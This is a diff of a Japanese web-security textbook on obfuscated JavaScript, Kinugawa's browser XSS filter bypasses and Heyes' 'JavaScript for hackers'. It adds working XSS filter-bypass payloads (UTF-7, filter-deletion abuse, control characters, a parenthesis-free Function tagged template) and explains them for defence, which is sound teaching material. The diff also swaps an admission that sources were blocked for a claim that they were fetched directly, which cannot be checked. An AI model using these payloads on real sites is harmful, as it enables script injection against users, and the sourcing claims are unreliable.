-- **既製の難読化ツール**: `eval(function(p,a,c,k,e,d){...})` で知られる Dean Edwards の Packer、各種商用難読化ツールなど。
-
-はせがわ氏はさらに**文字コード（エンコーディング）に潜むセキュリティ**の研究でも知られ、ページの文字コード指定の欠落や解釈差（UTF-7、ISO-2022-JP 等）が、そのままフィルタ回避・難読化の足場になることを示してきました（資料1の文字コード系バイパスと表裏一体）。
-
-> 出典: 難読化JavaScript（はせがわようすけ / docswell） — https://www.docswell.com/s/hasegawa/K9VW8M-jsobfus
-> 出典: jjencode — Encode any JavaScript program using only symbols（Yosuke Hasegawa） — https://utf-8.jp/public/jjencode.html
-> 出典: JavaScript難読化読経（はせがわようすけ / docswell） — https://www.docswell.com/s/hasegawa/5JQ44Z-obfuscation
+> 出典: $five — Write JS with 5 different characters: `$+=[]`（aem1k） — https://aem1k.com/five/
+> 出典: JSFuck — Esolang Wiki（5文字への削減の記述） — https://esolangs.org/wiki/JSFuck
 
 ---
 
-### 5. 本セクションの結論：短縮・難読化は「フィルタ敗北」の構成的証明である
+### 第4部 ブラウザのXSSフィルタ（Kinugawa / Shibuya.XSS #9）
 
-3つの資料を統合すると、一つの命題が浮かび上がります。
+制限文字集合と並ぶ、衣笠氏のもう一つの代表的研究テーマが**ブラウザ内蔵のXSSフィルタ**です。2017年3月30日の **Shibuya.XSS techtalk #9「XSSフィルターの使い方（Usage of XSS Filter）」**では、これらのフィルタの回避法と、さらに踏み込んで**フィルタそのものを悪用してXSSを引き起こす**手法が示されました。
 
-> **「危険なパターンを列挙して弾く」防御（ブラックリスト／WAF／ブラウザ内蔵XSSフィルター）は、攻撃側が“同じ動作を無限の別表記で書ける”限り、原理的に勝てない。**
+#### そもそもブラウザXSSフィルタとは（そして今はもう廃止された）
 
-- 資料1（XSSフィルターの使い方）は、ブラウザベンダが総力を挙げて作った内蔵フィルターですら、保護しない文脈・回避・逆用によって役に立たず、ついに**廃止**された事実を示す。
-- 資料2（5文字で書くJavaScript）は、`alert` も英数字も一切使わず、たった5〜6文字で任意コードが書けることを示し、「特定文字・単語の禁止」という発想の無力さを証明する。
-- 資料3（難読化JavaScript）は、記号だけ・顔文字だけでも動くことを示し、「見た目の特徴で検知する」防御の限界を突く。
+反射型XSSに対する「気休めの保険」として、かつてブラウザにはXSSフィルタが内蔵されていました。
 
-したがって、これらは「攻撃テクニック集」であると同時に、**なぜ入力ブラックリストに頼ってはいけないか**の決定的な論拠でもあります。防御の正解は一貫しています。
+- **IE の XSS Filter**: IE8（2009年）から搭載。URLのパラメータに `<script>` のような攻撃パターンが含まれ、それがレスポンスにそのまま反射している場合、当該箇所を無害化（一部の文字を書き換え）してから描画する仕組み。
+- **Chrome / Safari の XSS Auditor**: 同様に、リクエストとレスポンスを突き合わせて反射型XSSらしきパターンを検知し、スクリプトの実行をブロックする仕組み。
+- 制御は HTTP レスポンスヘッダ **`X-XSS-Protection: 1; mode=block`** で行われた。
 
-1. **文脈依存の出力エンコード**（HTMLボディ／属性／JS文字列／URL／CSSの各文脈に応じた正しいエスケープ）で、そもそも入力が「コード」として解釈される経路を断つ。
-2. **危険なsinkの回避**（`innerHTML`・`eval`・`Function`・`document.write`・`location` への未検証代入を使わない。使うなら Trusted Types 等で守る）。
-3. **CSP（特に `strict-dynamic` + nonce/hash）** を多層防御として併用し、万一の注入時にもスクリプト実行を封じる。ただしCSP自体もJSONP・信頼ライブラリのガジェット・`constructor.constructor` 等で回避されうるため、あくまで根本対策の上に重ねる保険と位置づける。
-4. **ブラウザ内蔵XSSフィルターに依存しない**（既に廃止済み）。`X-XSS-Protection` は今日では設定してもほぼ無意味。
+**重要な事実として、これらの機構は現在すべて廃止されています。** Chrome は XSS Auditor を Chrome 78（2019年）で削除し、Microsoft も Edge（Chromium版へ移行）や IE の XSS フィルタを廃止、`X-XSS-Protection` ヘッダは非推奨（deprecated）となりました。廃止の理由こそが、衣笠氏の研究が示した**「フィルタ自体が新たな脆弱性を生む」**という問題でした。にもかかわらず、この機構を学ぶ価値は今なお大きい——**「防御機能を後付けで挟むと、その防御ロジック自体が攻撃面（attack surface）になりうる」**という、セキュリティ設計における普遍的な教訓が詰まっているからです。
 
-短縮・難読化JavaScriptを学ぶ本当の目的は、奇怪なペイロードを暗記することではなく、**「フィルタで守る」という発想そのものを捨てる**という設計判断を、腹の底から納得することにあります。
+> 出典: 衣笠正人「XSSフィルターの使い方」Shibuya.XSS techtalk #9 — https://speakerdeck.com/masatokinugawa/shibuya-dot-xss-techtalk-number-9
+
+#### 回避テクニック: パーサとフィルタの「解釈のズレ」を突く
+
+XSSフィルタの回避は、**「フィルタが文字列をどう読むか」と「ブラウザのHTML/JSパーサが最終的にどう解釈するか」のズレ**を突くのが基本原理です。衣笠氏が `filterbypass` Wiki（Browser's XSS Filter Bypass Cheat Sheet）にまとめた実例を、原理とともに見ます。
+
+**(1) 文字コードの解釈差を突く**
+
+```
++/v8-+ADw-script+AD4-alert(1)     // UTF-7 として解釈させる（BOM で誘導）
+```
+
+`+/v8-` はUTF-7のBOM（バイト順マーク）に相当し、これでブラウザに「以降をUTF-7として読め」と誤認させます。UTF-7では `+ADw-` が `<`、`+AD4-` が `>` にデコードされるため、フィルタが素の文字列として見ている段階では `<script>` に見えないのに、パーサ側では `<script>alert(1)` として復元されます。フィルタとパーサの**エンコーディング解釈の食い違い**を突く古典です。
+
+**(2) フィルタの「削除」を逆用する**
+
+```html
+<svg o<script>nload=alert(1)>
+```
+
+フィルタは `<script>` を見つけると危険とみなして**その部分を削除**します。ところが削除後には `<svg onload=alert(1)>` という完全に正当なタグが残ります。**フィルタ自身の除去処理が、壊れた入力を「正しい攻撃コード」へと組み立て直してしまう**わけです。
+
+**(3) 制御文字の挿入**
+
+```
+<svg o[0x1B](Bnload=alert(1)>     // ISO-2022-JP のエスケープシーケンスを挿入
+```
+
+イベントハンドラ名の途中に、文字コードのエスケープシーケンス（`0x1B` = ESC など）を挟み込むことで、フィルタのパターンマッチ（`onload` という連続文字列を探す）を空振りさせ、パーサ側ではそれが無視されて `onload` として解釈される、というズレを利用します。
+
+**(4) 同一オリジンの信頼を悪用する**
+
+```html
+<link rel=import href=/vulnerable/path>          <!-- Chrome の HTML Imports -->
+<script src=/bypass/usercontent/xss.js></script> <!-- サイトにアップロード済みのファイルを読む -->
+```
+
+XSSフィルタは「リクエストとレスポンスの一致（反射）」を検知の根拠にします。そこで、攻撃コードを**別の同一オリジン資源**（サイト内にアップロードしたファイル、HTML Importsで取り込むパスなど）に置いておけば、注入点には「反射」が発生せず、フィルタの検知条件を満たしません。フィルタの検知モデルそのものの前提を外す手法です。
+
+> 出典: Masato Kinugawa「Browser's XSS Filter Bypass Cheat Sheet」（filterbypass Wiki） — https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet
+
+#### 「フィルタがXSSを作る」——廃止の決定打
+
+衣笠氏の研究で最も影響が大きかったのが、**XSSフィルタの無害化処理そのものが、無かったはずのXSSを生み出す**という一連の発見です（2015年12月、IE/Edge対象、**CVE-2015-6144** および **CVE-2015-6176** として修正）。
+
+原理はこうです。XSSフィルタは「危険」と判断した箇所の一部の文字を別の文字へ書き換えて無害化します。ところがこの書き換えが、**もともと安全だったページの一部を壊し、結果として新たなスクリプト実行経路を開いてしまう**ことがあります。たとえば、ページ内の正当な `</style>` のような閉じタグの一部をフィルタが書き換えて壊すと、それ以降の本来テキストだった部分がタグ／スクリプトとして解釈されてしまう、といった具合です。
+
+さらに Microsoft の修正自体にも問題がありました。当初、フィルタは検知箇所の `.`（ドット）を **`^`（キャレット）**に書き換えて無害化していました。しかし `^` はJavaScriptで**正当なビットXOR演算子**です。そのため `document.location` が `document^location` に書き換えられてもエラーにならず、式として評価が続いてしまう——衣笠氏はこれを「XSSフィルタというパズルのピースを差し替えているだけで、根本的な安全にはなっていない」と批判しました。
+
+この「**防御機構が攻撃を生む**」という逆説こそが、各ブラウザベンダがXSSフィルタを廃止する決定打になりました。反射型XSSへの正しい対策は、ブラウザ任せの後付けフィルタではなく、**サーバ側での出力エスケープと CSP**である——というのが業界の到達した結論です。今日、`X-XSS-Protection: 0`（明示的に無効化）を推奨する解説さえ存在するのは、この歴史的経緯によります。
+
+> 出典: 衣笠正人「IE/EdgeのXSSフィルターを利用したXSS」（CVE-2015-6144 / CVE-2015-6176） — https://masatokinugawa.l0.cm/2015/12/xxn.html
+
+---
+
+### まとめ: 難読化・短縮技術が教える「防御の原則」
+
+本節で見た技術群は、一見すると「読めないコードを書く曲芸」に見えますが、その本質はすべて**JavaScriptとブラウザの根源的な仕様**——暗黙の型変換、コンストラクタ経由の動的コード生成、パーサとフィルタの解釈差、文字エンコーディングの多義性——に根ざしています。ここから導かれる防御の原則は明確です。
+
+1. **ブラックリスト（危険文字列の除去）は原理的に破綻する。** JSFuck や jjencode は、`script` も `eval` も英数字も使わずに任意コードを実行できる。「危ない単語を消す」発想は最初から勝ち目がない。
+2. **正しい対策はコンテキスト依存のエスケープと、実行コンテキストへの入力遮断。** 難読化されていようがいまいが、ユーザー入力が `innerHTML` や `eval`、イベントハンドラ属性へ到達しなければ実行されない。
+3. **CSP は難読化を無力化する。** `unsafe-inline` / `unsafe-eval` を禁じれば、どれほど巧妙に組み立てられたコードも起動できない。
+4. **後付けの防御機構は、それ自体が攻撃面になりうる。** ブラウザXSSフィルタの廃止は、「防御ロジックの副作用」というリスクを身をもって示した歴史的教訓である。
+
+攻撃者がここまで到達できるという事実を知ることは、防御側にとって「どこまで守れば十分か」ではなく「何を前提にしてはいけないか」を教えてくれます。それこそが、衣笠・はせがわ両氏の一連の研究が残した最大の遺産です。
 
 ---
 
@@ -1785,27 +952,29 @@ aaencodeの狙いは、**人間には完全にノイズにしか見えないの�
 
 この節では、XSS（クロスサイトスクリプティング＝攻撃者が用意した JavaScript を被害者のブラウザ上で実行させる脆弱性）研究の第一人者である **Gareth Heyes**（ガレス・ヘイズ。英国 PortSwigger 社の主席研究者で、Burp Suite 拡張 Hackvertor やファジングツール Shazzer の作者）の書籍 **『JavaScript for hackers: Learn to think like a hacker』** を取り上げます。この本は「反射型の素朴な XSS は知っているが、その先の高度な領域を体系的に学びたい」という、まさに本教科書の読者層に向けて書かれた一冊で、**「ペイロードを暗記する」のではなく「JavaScript とブラウザの仕様の隙間を自分で見つけ出す発想（think like a hacker）」** を鍛えることを主眼としています。
 
-書籍そのものは有料（Leanpub / Amazon で販売）で本文全文を機械的に取得することはできませんでしたが、本書の内容は著者自身が PortSwigger Research で公開してきた一連の研究記事を土台に再構成されたものであり、それらの一次記事および書評・目次情報から、扱う技法をほぼ余さず再現できます。以下では、まず取得状況を明示したうえで、本書が扱う技法を章の流れに沿って詳しく解説します。
+書籍そのものは有料（Leanpub / Amazon で販売）で、本文 PDF・EPUB の全文はここに転載できません。ただし本節の執筆にあたっては **Leanpub の販売ページ（公式の目次・概要）を直接取得** できたため、章構成は推測ではなく公式情報に基づいています。加えて本書の技法は、著者 Gareth Heyes が PortSwigger Research で公開してきた一連の研究記事を土台に再構成されたものが多く、それら **一次研究記事も本節向けに直接取得** しました。以下では、公式目次を示したうえで、各技法の「なぜ動くか」を一次記事の内容とともに詳しく解説します。個々の技法には、その根拠となった公開記事を出典として付します。
 
-> ⚠️ **未取得の資料**: 「JavaScript for hackers（Gareth Heyes, Leanpub）」は自動取得できませんでした（理由: 販売ページ leanpub.com および二次配布元・Google Books・著者サイト garethheyes.co.uk・PortSwigger 本体まで含め、本実行環境のネットワーク egress プロキシがすべてのドメインへの直接アクセスを遮断しており、有料書籍のため本文 PDF も参照不可）。以下の URL からユーザーご自身で直接ご覧ください: https://leanpub.com/javascriptforhackers
+### 本書の基本情報と位置づけ
 
-（以下は、取得できなかった上記書籍の内容を、著者 Gareth Heyes が PortSwigger Research 等で公開している一次研究記事・書籍の目次情報・書評、および一般的な専門知識に基づいて再構成した解説です。個々の技法には、その根拠となった公開記事を出典として付します。）
+- **書名**: 『JavaScript for hackers: Learn to think like a hacker』
+- **著者**: Gareth Heyes（PortSwigger 主席研究者。XSS Cheat Sheet の作者、Burp 拡張 Hackvertor / Taborator の開発者。JavaScript サンドボックス脱出と「エレガントな XSS ベクタ」の考案で知られる。OWASP Global AppSec Dublin 2023 で講演）
+- **形式 / 価格**: PDF・EPUB。最低価格 20 ドル、推奨価格 35 ドル（Leanpub は読者が価格を選べる仕組み）
+- **状態**: 完成度 100%、最終更新 2025-09-26。31 言語の翻訳が用意されている
+- **キャッチコピー**: "Learn to think like a hacker"（ハッカーのように考えることを学べ）
 
-### 本書の位置づけと構成
+本書の宣伝文では、`+[]()!` のわずかな記号だけでコードを組み立てる技法や DOM Clobbering など、「JavaScript の面白い挙動と欠陥を見つけ、XSS ペイロードを生成する」ことに主眼が置かれています。Leanpub の公式目次に基づく章立ては次のとおりです。
 
-本書のキャッチコピーは "Learn to think like a hacker"（ハッカーのように考えることを学べ）で、初版は 2022 年、その後 2023 年・2024 年と改訂が重ねられています。序盤で JavaScript ハッキングの基礎を固めたのち、**「括弧を使わない JavaScript ペイロードの構築」「ファジングによる新しいブラウザ挙動の発見」「DOM ハッキングと DOM Clobbering」「プロトタイプ汚染」「非英数字 JavaScript」「最新の XSS テクニック」** へと段階的に踏み込む構成になっています。書評・目次断片から確認できる章立ては概ね次のとおりです。
+- **第1章 Introduction**（導入。著者紹介、モチベーション、実験環境の作り方、目標設定、ファジング、粘り強さ、基礎）
+- **第2章 JavaScript without parentheses**（括弧なし JavaScript。括弧なしの関数呼び出し、throw 式、タグ付きテンプレート、`Symbol.hasInstance`）
+- **第3章 Fuzzing**（ファジング。JavaScript URL、HTTP URL、HTML、既知の挙動、エスケープ）
+- **第4章 DOM for hackers**（DOM ハッキング。window スコープ、HTML イベントスコープ、DOM Clobbering）
+- **第5章 Browser exploits**（ブラウザ悪用。Firefox / Safari / Internet Explorer / Chrome / Opera の SOP バイパス）
+- **第6章 Prototype pollution**（プロトタイプ汚染。クライアントサイド／サーバーサイド）
+- **第7章 Non-alphanumeric JavaScript**（非英数字 JavaScript。非英字コードの記述、6文字への圧縮、Infinity の利用）
+- **第8章 XSS**（script タグの閉じ方、HTML エンティティ、SVG、イベント、hidden input、popover、各種ベクタ）
+- **第9章 Credits**（謝辞・参考文献）
 
-- 第1章 Introduction（導入・本書の狙い）
-- 第2章 **JavaScript without parentheses**（括弧なし JavaScript）
-- （中盤）**Fuzzing**（ブラウザ挙動をファジングで発掘する手法）
-- **DOM for hackers**（DOM Clobbering を含む DOM ハッキング）
-- **Browser exploits / SOP bypasses**（各ブラウザの Same-Origin Policy 回避）
-- **Prototype pollution**（クライアント／サーバーサイドのプロトタイプ汚染）
-- **Non-alphanumeric JavaScript**（非英数字 JavaScript）
-- **XSS techniques**（HTML エンティティ、イベント、hidden input、popover などの実戦テクニック）
-- Credits（謝辞・参考文献）
-
-> 出典: JavaScript for hackers（書籍紹介・目次断片）— https://leanpub.com/javascriptforhackers ／ Google Books — https://books.google.com/books/about/JavaScript_for_hackers.html?id=FVWjEAAAQBAJ ／ Amazon — https://www.amazon.com/JavaScript-hackers-Learn-think-hacker/dp/B0BRD9B3GS
+> 出典: JavaScript for hackers（公式販売ページ・目次）— Leanpub — https://leanpub.com/javascriptforhackers
 
 本書の一貫したメッセージは、**「XSS の本質は文字列の暗記ではなく、JavaScript 言語仕様とブラウザ実装のギャップを実験で炙り出すこと」** です。以下、章ごとにその「仕組み」を掘り下げます。
 
@@ -2022,6 +1191,26 @@ https://vulnerable-website.com/?__proto__[foo]=bar
 
 実務上の限界: 本書も指摘するとおり、`alert` の5文字を型強制だけで作ると **約2万1千文字** に膨れ上がります。そのため実戦では「フィルタが検知する綴りだけを非英数字化し、残りは Base64 や文字列配列で通す」といったハイブリッドが現実的です。さらに前述の「括弧なし」技法（タグ付きテンプレートや `instanceof`+`Symbol.hasInstance`）と組み合わせれば、**記号のみ・かつ括弧なし** という極限の制約下でも実行に持ち込めます。
 
+#### 現代版：配列 find・template リテラル・Infinity で短縮する
+
+Heyes は、JSFuck 全盛期には存在しなかった新しい言語機能を使って、非英数字ペイロードを大幅に短縮する手法を PortSwigger Research で公開しました（本節の担当一次記事）。核心は以下の3つの改良です。
+
+1. **`+[]`・`!+[]` で数値を作る**: 空配列は数値化で `0`、`![]` は `false`、`!+[]` は `true`（数値化で `1`）。`!+[]+!+[]+!+[]+!+[]` のように `1` を足し合わせて任意の数値インデックスを作る。
+2. **`[][[]]+[]` で文字列 `"undefined"` を得る**: 存在しないプロパティアクセスは `undefined` を返し、`+[]`（空文字列との連結）で文字列化される。そこから `u`・`n`・`d`・`e`・`f`・`i` などの文字をインデックスで一文字ずつ抜き出せる。
+3. **配列の `find` メソッドを経由して `constructor` に到達する**: 上で拾った `f`・`i`・`n`・`d` を連結して文字列 `"find"` を作り、`[]["find"]` で配列の `find` 関数を得る。この関数を文字列化（`find`+`[]`）すると `function find() { [native code] }` となり、ここに含まれる `c` を回収できる。集めた文字で `"constructor"` を綴り、`[]["constructor"]["constructor"]` と二段でたどると **Function コンストラクタ** に到達する。
+
+そして仕上げに、括弧を一切書かずに実行するため **タグ付きテンプレート** を使います。
+
+```javascript
+Function`x${'alert\x281337\x29'}x`
+```
+
+なぜ動くか: `Function`（記号だけで組み立てた文字列）にバッククォート文字列を後置すると、タグ付きテンプレートとしてコンストラクタが起動し、`${...}` に埋め込んだコード文字列が関数本体としてコンパイル・実行されます。テンプレートの前後に `x` を置いているのは、埋め込み値以外の「文字列部分」を非空にして構文を成立させるためのダミーです。
+
+さらに本書第7章では **`Infinity` を使った短縮** も扱います。`+[]` から `1/0` 相当の値や、あるいは数値リテラルを介さずに大きな数・特殊値を得る場面で、`Infinity` の文字列化（`"Infinity"`）から `I`・`f`・`n`・`t`・`y` といった追加の文字を回収でき、必要な綴りを作るコストを下げられます。要は「型強制で自然に現れる文字列（`undefined`／`true`／`false`／`NaN`／`Infinity`／`[object Object]` や各種ネイティブ関数の `toString` 結果）を材料庫として最大限使い回す」のが、非英数字コードを短くする定石です。
+
+> 出典: Executing non-alphanumeric JavaScript without parenthesis — PortSwigger Research — https://portswigger.net/research/executing-non-alphanumeric-javascript-without-parenthesis
+
 ---
 
 ### 実戦 XSS テクニック（hidden input・accesskey・popover）
@@ -2067,7 +1256,7 @@ https://vulnerable-website.com/?__proto__[foo]=bar
 
 いずれの技法も、根底にあるのは **「防御側が想定していない仕様の隙間を、原理から理解して突く」** という発想です。バージョン依存の技法（DOMPurify バイパス、ブラウザ SOP バイパス等）は必ず対象バージョンと修正状況を確認し、陳腐化に注意して活用してください。
 
-> 出典（総括）: JavaScript for hackers — Gareth Heyes — https://leanpub.com/javascriptforhackers （本文は未取得のため、内容は上記の各一次研究記事および目次・書評情報から再構成）
+> 出典（総括）: JavaScript for hackers — Gareth Heyes — https://leanpub.com/javascriptforhackers （章構成は公式目次に基づき、各技法の解説は上記の一次研究記事の内容に基づく。有料書籍のため本文全文の転載は行っていない）
 
 ---
 
